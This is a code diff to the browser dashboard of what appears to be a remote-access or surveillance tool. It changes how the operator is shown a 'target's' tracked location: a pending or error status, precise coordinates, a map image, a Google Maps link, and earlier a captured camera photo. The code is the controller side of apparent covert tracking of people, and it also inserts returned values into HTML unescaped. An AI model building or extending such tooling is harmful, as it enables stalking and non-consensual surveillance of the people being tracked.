@@ -905,25 +905,37 @@
                     
                     if (currentModal) renderModalContent();
 
-                    // --- AUTO POPUP FOR LOCATION + PHOTO ---
-                    if (cdata.location_url) {
-                        const locHash = selectedClientId + cdata.location_url + (cdata.camera_image || '');
+                    // --- AUTO POPUP FOR LOCATION + PRECISE MAP IMAGE ---
+                    if (cdata.location_status === 'pending') {
+                        if (!lastDataHashes['loc_status'] || lastDataHashes['loc_status'] !== 'pending') {
+                            lastDataHashes['loc_status'] = 'pending';
+                            showPopup('info', `<i class="fas fa-satellite-dish fa-spin"></i> Tracking target location...`);
+                        }
+                    } else if (cdata.location_status === 'error') {
+                        if (lastDataHashes['loc_status'] !== 'error') {
+                            lastDataHashes['loc_status'] = 'error';
+                            showPopup('error', `Location Error: ${cdata.location_msg}`);
+                        }
+                    } else if (cdata.location_status === 'success' && cdata.location_url) {
+                        const locHash = selectedClientId + cdata.location_url + (cdata.location_image || '');
                         if (!lastDataHashes['auto_loc'] || lastDataHashes['auto_loc'] !== locHash) {
                             lastDataHashes['auto_loc'] = locHash;
+                            lastDataHashes['loc_status'] = 'success';
                             const coords = cdata.location_url.split('q=')[1];
-                            const imgHtml = cdata.camera_image && cdata.camera_image.startsWith('loc_pic') ? 
-                                `<img src="/captured_images/${cdata.camera_image}" style="width:100%; border-radius:12px; margin-top:10px; border:1px solid var(--accent-primary);">` : '';
+                            const imgHtml = cdata.location_image ? 
+                                `<img src="${cdata.location_image}" style="width:100%; border-radius:12px; margin-top:10px; border:1px solid var(--accent-primary); box-shadow: 0 0 10px var(--glow-primary);">` : '';
                             
                             showPopup('info', `
                                 <div style="min-width:250px;">
-                                    <strong style="color:var(--accent-secondary);">📍 TARGET TRACKED</strong><br>
-                                    <small>${coords}</small>
+                                    <strong style="color:var(--accent-primary);">🎯 TARGET TRACKED (PRECISE)</strong><br>
+                                    <small style="color:var(--text-dim);">${coords}</small>
                                     ${imgHtml}
-                                    <div style="margin-top:8px;">
-                                        <button onclick="openModal('get_location')" style="padding:4px 10px; font-size:0.7rem;">View Map</button>
+                                    <div style="margin-top:10px; display:flex; gap:10px;">
+                                        <button onclick="openModal('get_location')" style="padding:4px 10px; font-size:0.7rem; flex:1;">Interact Map</button>
+                                        <a href="${cdata.location_url}" target="_blank" style="text-decoration:none; padding:4px 10px; font-size:0.7rem; background:var(--surface-light); border:1px solid var(--accent-primary); border-radius:12px; color:white; flex:1; text-align:center;">Open G-Maps</a>
                                     </div>
                                 </div>
-                            `);
+                            `, 10000); // Show longer for location
                         }
                     }
 
